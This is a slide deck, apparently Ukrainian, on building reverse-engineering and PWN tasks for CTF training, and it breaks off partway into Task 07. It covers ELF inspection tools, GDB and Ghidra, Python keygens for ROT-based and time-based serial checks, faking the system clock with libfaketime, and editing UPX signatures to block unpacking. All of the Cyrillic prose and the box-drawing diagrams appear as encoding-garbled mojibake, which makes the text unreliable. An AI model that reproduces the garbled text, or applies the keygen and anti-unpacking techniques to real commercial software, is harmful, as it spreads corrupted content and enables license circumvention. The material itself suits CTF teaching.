---
theme: default
background: https://images.unsplash.com/photo-1754357906539-7ae638a49740?q=80&w=2070
class: text-center
highlighter: shiki
lineNumbers: true
info: |
  ## –°—Ç–≤–æ—Ä–µ–Ω–Ω—è –∑–∞–≤–¥–∞–Ω—å RE/PWN –¥–ª—è CTF
drawings:
  persist: false
transition: slide-left
title: –°—Ç–≤–æ—Ä–µ–Ω–Ω—è –∑–∞–≤–¥–∞–Ω—å RE/PWN –¥–ª—è CTF
mdc: true
---

# –°—Ç–≤–æ—Ä–µ–Ω–Ω—è –∑–∞–≤–¥–∞–Ω—å RE/PWN –¥–ª—è CTF

---

# RE: Reverse Engineering

**–ú–µ—Ç–∞**: –ê–Ω–∞–ª—ñ–∑ –±—ñ–Ω–∞—Ä–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤ –¥–ª—è —Ä–æ–∑—É–º—ñ–Ω–Ω—è –ª–æ–≥—ñ–∫–∏

- üîç –°—Ç–∞—Ç–∏—á–Ω–∏–π –∞–Ω–∞–ª—ñ–∑: strings, objdump, readelf
- üêõ –î–∏–Ω–∞–º—ñ—á–Ω–∏–π –∞–Ω–∞–ª—ñ–∑: GDB, strace
- üß© –î–µ–∫–æ–º–ø—ñ–ª—è—Ü—ñ—è: Ghidra, IDA
- üìà –ü—Ä–æ–≥—Ä–µ—Å—ñ—è: –≤—ñ–¥ —ñ–Ω–≤–µ–Ω—Ç–∞—Ä–∏–∑–∞—Ü—ñ—ó –¥–æ system calls

---

# PWN: Binary Exploitation

**–ú–µ—Ç–∞**: –ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π –ø–∞–º'—è—Ç—ñ

- üí• Buffer overflow: –ø–µ—Ä–µ–∑–∞–ø–∏—Å return address
- üîó ROP chains: –æ–±—Ö—ñ–¥ NX –∑–∞—Ö–∏—Å—Ç—É
- üìç Address leak: bypass ASLR/PIE
- üéØ –ü—Ä–æ–≥—Ä–µ—Å—ñ—è: –≤—ñ–¥ netcat –¥–æ ret2libc
---

# Task 01: –©–æ —Ç–∞–∫–µ ELF?

–°—Ç—Ä—É–∫—Ç—É—Ä–∞ –≤–∏–∫–æ–Ω—É–≤–∞–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤ Linux

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ  ELF Header         ‚îÇ  ‚Üê –ú–µ—Ç–∞–¥–∞–Ω—ñ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ  Program Headers    ‚îÇ  ‚Üê –î–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ  Sections           ‚îÇ  ‚Üê –ö–æ–¥, –¥–∞–Ω—ñ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ  Section Headers    ‚îÇ  ‚Üê –û–ø–∏—Å —Å–µ–∫—Ü—ñ–π
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

**Little Endian**: `0x12345678` ‚Üí `78 56 34 12`

---

# Task 01: –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç file

–í–∏–∑–Ω–∞—á–µ–Ω–Ω—è —Ç–∏–ø—É —Ñ–∞–π–ª—É

```bash
file build/re101
```

**–í–∏–≤—ñ–¥:**
```
ELF 64-bit LSB executable, x86-64
dynamically linked
not stripped
```

**–©–æ –¥—ñ–∑–Ω–∞–ª–∏—Å—å**: –∞—Ä—Ö—ñ—Ç–µ–∫—Ç—É—Ä–∞, linkage, symbols

---

# Task 01: –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç readelf

–ß–∏—Ç–∞–Ω–Ω—è ELF —Å—Ç—Ä—É–∫—Ç—É—Ä

````md magic-move
```bash
readelf -h build/re101
# ELF –∑–∞–≥–æ–ª–æ–≤–æ–∫
```

```bash
# Entry point address: 0x400430
# Number of sections: 30
# Machine: x86-64
```
````

**–ö–æ—Ä–∏—Å–Ω–æ**: `-l` (segments), `-S` (sections), `-s` (symbols)

---

# Task 01: –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç objdump

–î–∏–∑–∞—Å–µ–º–±–ª—é–≤–∞–Ω–Ω—è —Ç–∞ —Å–∏–º–≤–æ–ª–∏

```bash
objdump -T build/re101
# DYNAMIC SYMBOL TABLE:
# puts, strcmp, __libc_start_main
```

**–©–æ –±–∞—á–∏–º–æ**: —ñ–º–ø–æ—Ä—Ç–æ–≤–∞–Ω—ñ —Ñ—É–Ω–∫—Ü—ñ—ó –∑ libc

---

# Task 01: –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç strings

–í–∏—Ç—è–≥—É–≤–∞–Ω–Ω—è —Ç–µ–∫—Å—Ç–æ–≤–∏—Ö —Ä—è–¥–∫—ñ–≤

```bash
strings -a build/re101 | head -20
```

**–û–ø—Ü—ñ—ó:**
- `-a` - —Å–∫–∞–Ω—É–≤–∞—Ç–∏ –≤–µ—Å—å —Ñ–∞–π–ª
- `-n <num>` - –º—ñ–Ω—ñ–º–∞–ª—å–Ω–∞ –¥–æ–≤–∂–∏–Ω–∞

**–ù–∞–≤—á–∞–Ω–Ω—è**: –ü–æ—à—É–∫ –ø—Ä–∏—Ö–æ–≤–∞–Ω–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó

---

# Task 01: –ü–æ–∫—Ä–æ–∫–æ–≤–µ —Ä—ñ—à–µ–Ω–Ω—è

–ü–æ—Å–ª—ñ–¥–æ–≤–Ω—ñ—Å—Ç—å –∞–Ω–∞–ª—ñ–∑—É

```bash
file build/re101              # –ö—Ä–æ–∫ 1
readelf -h build/re101         # –ö—Ä–æ–∫ 2
objdump -T build/re101         # –ö—Ä–æ–∫ 3
strings -a build/re101         # –ö—Ä–æ–∫ 4
```

**–ú–µ—Ç–æ–¥–æ–ª–æ–≥—ñ—è**: –ó–∞–≤–∂–¥–∏ –ø–æ—á–∏–Ω–∞—Ç–∏ –∑ —ñ–Ω–≤–µ–Ω—Ç–∞—Ä–∏–∑–∞—Ü—ñ—ó

---

# Task 02: Hardcoded Secrets

–ù–µ–±–µ–∑–ø–µ–∫–∞ –≤—à–∏—Ç–∏—Ö —Å–µ–∫—Ä–µ—Ç—ñ–≤ —É –∫–æ–¥

```c
// ‚ùå –ü–û–ì–ê–ù–û
const char *key = "MyS3cr3tP@ssw0rd";

// ‚úÖ –î–û–ë–†–ï
const char *key = getenv("APP_PASSWORD");
```

**–ü—Ä–æ–±–ª–µ–º–∏**: –≤–∏—Ç—ñ–∫ —á–µ—Ä–µ–∑ strings, git —ñ—Å—Ç–æ—Ä—ñ—è, –Ω–µ–º–æ–∂–ª–∏–≤–æ –∑–º—ñ–Ω–∏—Ç–∏

---

# Task 02: –Ø–∫ –ø—Ä–∞—Ü—é—î strings?

–°–∫–∞–Ω—É–≤–∞–Ω–Ω—è –¥—Ä—É–∫–æ–≤–∞–Ω–∏—Ö —Å–∏–º–≤–æ–ª—ñ–≤

```bash
strings -a build/re102
# S3R14L-ABCD-1337  ‚Üê –ó–Ω–∞–π–¥–µ–Ω–æ!
```

**–ü–∞—Ä–∞–º–µ—Ç—Ä–∏**: –º—ñ–Ω—ñ–º—É–º 4 —Å–∏–º–≤–æ–ª–∏ –ø—ñ–¥—Ä—è–¥ (ASCII/UTF-8)

---

# Task 02: Regular Expressions

–ë–∞–∑–æ–≤–∏–π —Å–∏–Ω—Ç–∞–∫—Å–∏—Å –¥–ª—è grep

```bash
# –°–ø–µ—Ü—ñ–∞–ª—å–Ω—ñ —Å–∏–º–≤–æ–ª–∏
.     # –ë—É–¥—å-—è–∫–∏–π —Å–∏–º–≤–æ–ª
*     # 0 –∞–±–æ –±—ñ–ª—å—à–µ
+     # 1 –∞–±–æ –±—ñ–ª—å—à–µ
^     # –ü–æ—á–∞—Ç–æ–∫ —Ä—è–¥–∫–∞
$     # –ö—ñ–Ω–µ—Ü—å —Ä—è–¥–∫–∞
```

**–ü—Ä–∏–∫–ª–∞–¥**: `[A-Z0-9]+-[A-Z0-9]+` –¥–ª—è —Å–µ—Ä—ñ–π–Ω–∏–∫—ñ–≤

---

# Task 02: –ü–æ—à—É–∫ —Å–µ—Ä—ñ–π–Ω–∏–∫—ñ–≤

–§—ñ–ª—å—Ç—Ä–∞—Ü—ñ—è —á–µ—Ä–µ–∑ grep

````md magic-move
```bash
strings -a build/re102
# –ë–∞–≥–∞—Ç–æ —Ä—è–¥–∫—ñ–≤...
```

```bash
strings -a build/re102 | grep -E '[A-Z0-9]+-[A-Z0-9]+'
# S3R14L-ABCD-1337
```
````

**–¢–µ—Ö–Ω—ñ–∫–∞**: Regex –¥–ª—è –∑–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è –ø–∞—Ç—Ç–µ—Ä–Ω—ñ–≤

---

# Task 02: –ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ –∑–Ω–∞–π–¥–µ–Ω–æ–≥–æ

–¢–µ—Å—Ç—É–≤–∞–Ω–Ω—è —Å–µ—Ä—ñ–π–Ω–∏–∫–∞

```bash
./build/re102 Alice S3R14L-ABCD-1337
# FLAG{task2_ok_Alice}
```

**–£—Å–ø—ñ—Ö**: Hardcoded –∫–ª—é—á –∑–Ω–∞–π–¥–µ–Ω–æ!

---

# Task 02: –ó–∞—Ö–∏—Å—Ç –≤—ñ–¥ –≤–∏—Ç—è–≥—É–≤–∞–Ω–Ω—è

–ú–µ—Ç–æ–¥–∏ –æ–±—Ñ—É—Å–∫–∞—Ü—ñ—ó —Ä—è–¥–∫—ñ–≤

```c
// XOR encoding
const char encoded[] = {0x53^0xAA, 0x45^0xAA, ...};
char *key = decode_xor(encoded, 0xAA);

// –•–µ—à—É–≤–∞–Ω–Ω—è
const char *hash = "a94a8fe5ccb19ba61...";
if (sha1(input) == hash) { ... }
```

**–ï—Ñ–µ–∫—Ç–∏–≤–Ω—ñ—Å—Ç—å**: –£—Å–∫–ª–∞–¥–Ω—é—î, –∞–ª–µ –Ω–µ –∑–∞–ø–æ–±—ñ–≥–∞—î

---

# Task 03: –©–æ —Ç–∞–∫–µ ROT13?

–ü—Ä–æ—Å—Ç–∏–π —à–∏—Ñ—Ä –∑–∞–º—ñ–Ω–∏

```
A B C ... M N O P ... Z
‚Üì ‚Üì ‚Üì     ‚Üì ‚Üì ‚Üì ‚Üì     ‚Üì
N O P ... Z A B C ... M
```

**–ü—Ä–∏–∫–ª–∞–¥–∏:**
- `HELLO` ‚Üí `URYYB`
- `Alice` ‚Üí `Nyvpr`

**–í–ª–∞—Å—Ç–∏–≤—ñ—Å—Ç—å**: ROT13(ROT13(x)) = x

---

# Task 03: –ß–æ–º—É strings –Ω–µ –¥–æ–ø–æ–º–æ–∂–µ?

–î–∏–Ω–∞–º—ñ—á–Ω–∞ –≥–µ–Ω–µ—Ä–∞—Ü—ñ—è

```bash
strings -a build/re103 | grep -i flag
# FLAG{task3_ok_%s}  ‚Üê –§–æ—Ä–º–∞—Ç —î, –∞–ª–µ –Ω–µ —Å–µ—Ä—ñ–π–Ω–∏–∫!
```

**–ü—Ä–∏—á–∏–Ω–∞**: –°–µ—Ä—ñ–π–Ω–∏–∫ –≥–µ–Ω–µ—Ä—É—î—Ç—å—Å—è –ø—ñ–¥ —á–∞—Å –≤–∏–∫–æ–Ω–∞–Ω–Ω—è

---

# Task 03: –ó–∞–ø—É—Å–∫ —á–µ—Ä–µ–∑ GDB

–î–∏–Ω–∞–º—ñ—á–Ω–∏–π –∞–Ω–∞–ª—ñ–∑

````md magic-move
```bash
gdb build/re103
```

```bash
(gdb) break strcmp
(gdb) run Alice TEST123
```

```bash
(gdb) x/s $rdi
0x...: "Nyvpr"    ‚Üê ROT13 –≤—ñ–¥ Alice!
```
````

**–í–∏—è–≤–ª–µ–Ω–Ω—è**: –ê–ª–≥–æ—Ä–∏—Ç–º —Ç—Ä–∞–Ω—Å—Ñ–æ—Ä–º–∞—Ü—ñ—ó

---

# Task 03: x86-64 —Ä–µ–≥—ñ—Å—Ç—Ä–∏

–û—Å–Ω–æ–≤–Ω—ñ —Ä–µ–≥—ñ—Å—Ç—Ä–∏ –ø—Ä–æ—Ü–µ—Å–æ—Ä–∞

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ rax     ‚îÇ Return value             ‚îÇ
‚îÇ rdi     ‚îÇ 1-–π –∞—Ä–≥—É–º–µ–Ω—Ç —Ñ—É–Ω–∫—Ü—ñ—ó     ‚îÇ
‚îÇ rsi     ‚îÇ 2-–π –∞—Ä–≥—É–º–µ–Ω—Ç             ‚îÇ
‚îÇ rdx     ‚îÇ 3-–π –∞—Ä–≥—É–º–µ–Ω—Ç             ‚îÇ
‚îÇ rip     ‚îÇ Instruction Pointer      ‚îÇ
‚îÇ rsp     ‚îÇ Stack Pointer            ‚îÇ
‚îÇ rbp     ‚îÇ Base Pointer             ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

**Calling Convention**: rdi, rsi, rdx, rcx, r8, r9, —Å—Ç–µ–∫

---

# Task 03: –ö–æ–º–∞–Ω–¥–∞ x/s –≤ GDB

–ü–µ—Ä–µ–≥–ª—è–¥ –ø–∞–º'—è—Ç—ñ —è–∫ —Ä—è–¥–∫–∞

```bash
x/s $rdi
# x = examine
# /s = string format
# $rdi = —Ä–µ–≥—ñ—Å—Ç—Ä rdi
```

**–†–µ–∑—É–ª—å—Ç–∞—Ç**: –¢—Ä–∞–Ω—Å—Ñ–æ—Ä–º–æ–≤–∞–Ω–∏–π —Ä—è–¥–æ–∫ –≤ –ø–∞–º'—è—Ç—ñ

---

# Task 03: –ì–µ–Ω–µ—Ä–∞—Ü—ñ—è ROT13

Python implementation

```python
def rot13(text):
    result = []
    for char in text:
        if 'a' <= char <= 'z':
            result.append(chr((ord(char)-ord('a')+13)%26+ord('a')))
        elif 'A' <= char <= 'Z':
            result.append(chr((ord(char)-ord('A')+13)%26+ord('A')))
        else:
            result.append(char)
    return ''.join(result)
```

---

# Task 03: –ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–∞ - ltrace

–¢—Ä–∞—Å—É–≤–∞–Ω–Ω—è –±—ñ–±–ª—ñ–æ—Ç–µ—á–Ω–∏—Ö –≤–∏–∫–ª–∏–∫—ñ–≤

```bash
ltrace ./build/re103 Alice TEST123
# strcmp("Nyvpr", "TEST123") = -44
```

**–ü—Ä–æ—Å—Ç—ñ—à–µ**: –û–¥—Ä–∞–∑—É –≤–∏–¥–Ω–æ –ø–æ—Ä—ñ–≤–Ω—è–Ω–Ω—è!

---

# Task 04: ROT-N –∑—ñ strlen

–ó—Å—É–≤ –∑–∞–ª–µ–∂–∏—Ç—å –≤—ñ–¥ –¥–æ–≤–∂–∏–Ω–∏

```c
int n = strlen(name) % 26;
serial = ROT-N(name, n);
```

**–ü—Ä–∏–∫–ª–∞–¥**: `Alice` (5 –ª—ñ—Ç–µ—Ä) ‚Üí ROT-5 ‚Üí `Fqnhj`

---

# Task 04: –í—ñ–¥–∫—Ä–∏—Ç—Ç—è —É Ghidra

–ü–æ–∫—Ä–æ–∫–æ–≤–∞ —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—è

**–ö—Ä–æ–∫–∏:**
1. –ó–∞–ø—É—Å—Ç–∏—Ç–∏ Ghidra
2. Create New Project
3. Import File ‚Üí `build/re104`
4. Auto-analyze ‚Üí Yes
5. Symbol Tree ‚Üí Functions ‚Üí main

**–†–µ–∑—É–ª—å—Ç–∞—Ç**: –î–µ–∫–æ–º–ø—ñ–ª—å–æ–≤–∞–Ω–∏–π C –∫–æ–¥

---

# Task 04: –Ü–Ω—Ç–µ—Ä—Ñ–µ–π—Å Ghidra

–¢—Ä–∏ –æ—Å–Ω–æ–≤–Ω—ñ –ø–∞–Ω–µ–ª—ñ

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ Symbol   ‚îÇ Listing   ‚îÇ Decompile   ‚îÇ
‚îÇ Tree     ‚îÇ (ASM)     ‚îÇ (C code)    ‚îÇ
‚îÇ          ‚îÇ           ‚îÇ             ‚îÇ
‚îÇFunctions ‚îÇ  push rbp ‚îÇ int main()  ‚îÇ
‚îÇ ‚îî‚îÄmain   ‚îÇ  mov rbp  ‚îÇ {           ‚îÇ
‚îÇ ‚îî‚îÄrot_n  ‚îÇ  sub rsp  ‚îÇ   strlen()  ‚îÇ
‚îÇ          ‚îÇ           ‚îÇ }           ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

**Decompile** - –Ω–∞–π–≤–∞–∂–ª–∏–≤—ñ—à–µ –≤—ñ–∫–Ω–æ!

---

# Task 04: –î–µ–∫–æ–º–ø—ñ–ª—å–æ–≤–∞–Ω–∏–π –∫–æ–¥

–ê–Ω–∞–ª—ñ–∑ —É Ghidra

```c
undefined8 main(int argc, char **argv) {
  size_t nameLen;
  nameLen = strlen(name);      // ‚Üê –î–æ–≤–∂–∏–Ω–∞
  int N = (int)nameLen % 26;    // ‚Üê –§–æ—Ä–º—É–ª–∞!
  rot_apply(buffer, name, N);
  // ...
}
```

**–ó–Ω–∞–π–¥–µ–Ω–æ**: –ê–ª–≥–æ—Ä–∏—Ç–º –æ–±—á–∏—Å–ª–µ–Ω–Ω—è –∑—Å—É–≤—É

---

# Task 04: –ù–∞–ø–∏—Å–∞–Ω–Ω—è –∫–µ–π–≥–µ–Ω–∞

Python keygen

```python
def rot_n(text, n):
    result = []
    for char in text:
        if 'a' <= char <= 'z':
            result.append(chr((ord(char)-ord('a')+n)%26+ord('a')))
        # ... –≤–µ–ª–∏–∫—ñ –ª—ñ—Ç–µ—Ä–∏
    return ''.join(result)

name = "Alice"
n = len(name) % 26  # 5
serial = rot_n(name, n)  # "Fqnhj"
```

---

# Task 05: Time-based –∞–ª–≥–æ—Ä–∏—Ç–º

–ó—Å—É–≤ –∑–º—ñ–Ω—é—î—Ç—å—Å—è –∫–æ–∂–Ω–æ—ó —Å–µ–∫—É–Ω–¥–∏

```c
time_t t = time(NULL);
int N = (int)(t % 20);
serial = ROT-N(name, N);
```

**–ü—Ä–æ–±–ª–µ–º–∞**: –°–µ—Ä—ñ–π–Ω–∏–∫ –¥—ñ–π—Å–Ω–∏–π –ª–∏—à–µ 1 —Å–µ–∫—É–Ω–¥—É!

---

# Task 05: Python basics

–ë–∞–∑–æ–≤–∏–π —Å–∏–Ω—Ç–∞–∫—Å–∏—Å –¥–ª—è –Ω–æ–≤–∞—á–∫—ñ–≤

```python
x = 5                  # –ó–º—ñ–Ω–Ω–∞
text = "Hello"         # –†—è–¥–æ–∫

def function(param):   # –§—É–Ω–∫—Ü—ñ—è
    result = param + 1
    return result

for char in text:      # –¶–∏–∫–ª
    print(char)
```

**–í—ñ–¥—Å—Ç—É–ø–∏**: 4 –ø—Ä–æ–±—ñ–ª–∏ (–≤–∞–∂–ª–∏–≤–æ!)

---

# Task 05: –ì–µ–Ω–µ—Ä–∞—Ü—ñ—è —Å–µ—Ä—ñ–π–Ω–∏–∫–∞

Time-based keygen

````md magic-move
```python
import time

t = int(time.time())
n = t % 20
```

```python
import time

def generate_serial(name):
    t = int(time.time())
    n = t % 20
    return rot_n(name, n)
```
````

**–®–í–ò–î–ö–û**: –ú—ñ–∂ –≥–µ–Ω–µ—Ä–∞—Ü—ñ—î—é —Ç–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è–º < 1 —Å–µ–∫!

---

# Task 05: –ê–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü—ñ—è

Bash one-liner

```bash
name="Alice"
serial=$(python3 keygen.py "$name" | grep Serial | awk '{print $3}')
./build/re105 "$name" "$serial"
```

**–ê–±–æ**: –ü–æ–≤–Ω—ñ—Å—Ç—é –≤ Python –∑ subprocess

---

# Task 05: Time manipulation

–ê—Ç–∞–∫–∞ –Ω–∞ time-based

```bash
# –ó–∞–º–æ—Ä–æ–∑–∏—Ç–∏ —Å–∏—Å—Ç–µ–º–Ω–∏–π —á–∞—Å
sudo date -s "2024-01-01 12:00:00"

# –ê–±–æ libfaketime
LD_PRELOAD=/usr/lib/faketime/libfaketime.so.1 \
  FAKETIME="2024-01-01 12:00:00" ./build/re105 Alice <serial>
```

**–ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–∞**: Bruteforce 0-19 (–∑–∞–≤–∂–¥–∏ —Å–ø—Ä–∞—Ü—é—î –æ–¥–∏–Ω)

---

# Task 06: –©–æ —Ç–∞–∫–µ UPX?

Ultimate Packer for eXecutables

**–©–æ —Ä–æ–±–∏—Ç—å:**
- –°—Ç–∏—Å–∫–∞—î –±—ñ–Ω–∞—Ä–Ω–∏–∫ (50-70% –º–µ–Ω—à–µ)
- –î–æ–¥–∞—î —Ä–æ–∑–ø–∞–∫–æ–≤—É–≤–∞—á (stub)
- –ü—Ä–∏ –∑–∞–ø—É—Å–∫—É: —Ä–æ–∑–ø–∞–∫–æ–≤—É—î ‚Üí –≤–∏–∫–æ–Ω—É—î

**–í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è**: –ó–º–µ–Ω—à–µ–Ω–Ω—è —Ä–æ–∑–º—ñ—Ä—É –∞–±–æ –ø—Ä–∏—Ö–æ–≤—É–≤–∞–Ω–Ω—è

---

# Task 06: –Ø–∫ –ø—Ä–∞—Ü—é—î UPX

–ú–µ—Ö–∞–Ω—ñ–∑–º –ø–∞–∫—É–≤–∞–Ω–Ω—è

```
–û—Ä–∏–≥—ñ–Ω–∞–ª ‚Üí –°—Ç–∏—Å–∫–∞–Ω–Ω—è ‚Üí +Stub ‚Üí –£–ø–∞–∫–æ–≤–∞–Ω–∏–π
(re106)                          (re106_packed)

–ü—Ä–∏ –∑–∞–ø—É—Å–∫—É:
1. Stub —Ä–æ–∑–ø–∞–∫–æ–≤—É—î –≤ –ø–∞–º'—è—Ç—å
2. –ü–µ—Ä–µ–¥–∞—î —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è
3. –ü—Ä–æ–≥—Ä–∞–º–∞ –ø—Ä–∞—Ü—é—î –Ω–æ—Ä–º–∞–ª—å–Ω–æ
```

---

# Task 06: –†–æ–∑–ø—ñ–∑–Ω–∞–≤–∞–Ω–Ω—è UPX

–í–∏—è–≤–ª–µ–Ω–Ω—è —É–ø–∞–∫–æ–≤–∞–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤

````md magic-move
```bash
file build/re106_packed
# ELF 64-bit ... stripped
```

```bash
strings -a build/re106_packed | head
# UPX!
# $Info: This file is packed with UPX...
```
````

**–û–∑–Ω–∞–∫–∞**: –†—è–¥–æ–∫ "UPX!" —É —Ñ–∞–π–ª—ñ

---

# Task 06: –†–æ–∑–ø–∞–∫—É–≤–∞–Ω–Ω—è

UPX –∫–æ–º–∞–Ω–¥–∏

```bash
# –†–æ–∑–ø–∞–∫—É–≤–∞–Ω–Ω—è
upx -d build/re106_packed -o build/re106_unpacked

# –ü–∞–∫—É–≤–∞–Ω–Ω—è
upx -9 binary

# –Ü–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è
upx -l packed_binary
```

**–ü—ñ—Å–ª—è —Ä–æ–∑–ø–∞–∫—É–≤–∞–Ω–Ω—è**: –ê–Ω–∞–ª—ñ–∑ —è–∫ –∑–≤–∏—á–∞–π–Ω–æ

---

# Task 06: –ó–∞—Ö–∏—Å—Ç –≤—ñ–¥ —Ä–æ–∑–ø–∞–∫—É–≤–∞–Ω–Ω—è

Modified UPX

```bash
# –ü–∞–∫—É–≤–∞–Ω–Ω—è
upx -9 binary

# –ó–º—ñ–Ω–∞ —Å–∏–≥–Ω–∞—Ç—É—Ä–∏ hex-—Ä–µ–¥–∞–∫—Ç–æ—Ä–æ–º
# "UPX!" ‚Üí —â–æ—Å—å —ñ–Ω—à–µ

# –¢–µ–ø–µ—Ä upx -d –Ω–µ —Å–ø—Ä–∞—Ü—é—î –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ!
```

**–û–±—Ö—ñ–¥**: –í—ñ–¥–Ω–æ–≤–∏—Ç–∏ —Å–∏–≥–Ω–∞—Ç—É—Ä—É –∞–±–æ –¥–∞–º–ø –∑ –ø–∞–º'—è—Ç—ñ

---

# Task 07: –©–æ —Ç–∞–∫–µ strace?

–¢—Ä–∞—Å—É–≤–∞–Ω–Ω—è —Å–∏—Å—Ç–µ–º–Ω–∏—Ö –≤–∏–∫–ª–∏–∫—ñ–≤

**–ü–æ–∫–∞–∑—É—î:**
- –í–∏–∫–ª–∏–∫–∏ —Ñ—É–Ω–∫—Ü—ñ–π —è–¥—Ä–∞ (open, read, socket)
- –ê—Ä–≥—É–º–µ–Ω—Ç–∏ —Ç–∞ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∏
- –°–∏–≥–Ω–∞–ª–∏ —Ç–∞ –ø–æ–º–∏–ª–∫–∏

**–ó–∞—Å—Ç–æ—Å—É–≤–∞–Ω–Ω—è**: –í–∏—è–≤–ª–µ–Ω–Ω—è –ø—Ä–∏—Ö–æ–≤–∞–Ω–æ—ó –ø–æ–≤–µ–¥—ñ–Ω–∫–∏

---

# Task 07: –©–æ —Ç–∞–∫–µ fork()?

–°—Ç–≤–æ—Ä–µ–Ω–Ω—è –¥–æ—á—ñ—Ä–Ω—å–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—É

```
–î–æ fork():
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ –ü—Ä–æ—Ü–µ—Å (PID) ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò

–ü—ñ—Å–ª—è fork():
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê    ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ –ë–∞—Ç—å–∫–æ  ‚îÇ    ‚îÇ –î–∏—Ç–∏–Ω–∞  ‚îÇ
‚îÇ (PID)   ‚îÇ    ‚îÇ(–Ω–æ–≤–∏–π PID)‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò    ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

**–í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è**: –ü—Ä–∏—Ö–æ–≤—É–≤–∞–Ω–Ω—è –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç—ñ

---

# Task 07: –í–∏–∫–ª–∏–∫ fork() —É –∫–æ–¥—ñ

